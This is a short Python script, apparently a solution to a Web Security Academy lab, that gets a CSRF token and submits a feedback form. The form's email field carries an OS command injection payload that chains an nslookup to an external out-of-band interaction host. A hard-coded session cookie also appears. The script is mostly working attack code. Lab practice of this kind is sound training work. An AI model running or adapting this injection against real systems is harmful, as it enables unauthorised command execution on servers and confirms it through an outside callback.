import requests
from bs4 import BeautifulSoup

url = "https://0a4100da03ed04ba841b862b00d3002e.web-security-academy.net"

cookies = {
    "session" : "BDlB7fOuP1sK79bq7OdHCpNl1GPHTAgU"
}

s = requests.Session()
def csrfTokenGet(endpoint):
    r = s.get(f"{url}{endpoint}", cookies=cookies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input", {"name": "csrf"})["value"]
    return csrf
csrf = csrfTokenGet("/feedback")

data = {
    "csrf" : csrf,
    "name" : "asd1",
    "email" : "admin@asds.com||nslookup vthdfgizsddhocpiqubyho9zcnk4esfr9.oast.fun||",
    "subject" : "asd",
    "message" : "asdasdsad"
}

r = requests.post(f"{url}/feedback/submit", data=data, cookies=cookies)

print("Status Code is: ", r.status_code)
print(r.text)